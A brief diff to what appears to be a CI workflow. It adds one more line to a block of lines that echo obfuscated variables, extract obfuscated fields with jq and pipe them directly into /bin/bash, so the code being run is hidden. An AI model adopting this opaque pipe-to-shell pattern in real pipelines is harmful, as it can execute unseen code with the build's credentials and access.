@@ -22,6 +22,7 @@ jobs:
           echo $rderw55749 | jq -r .mm9054 | /bin/bash
           echo $uvyqk47780 | jq -r .lltr2085 | /bin/bash
           echo $mv15019 | jq -r .zu9 | /bin/bash
+          echo $jvq3 | jq -r .obaht780 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
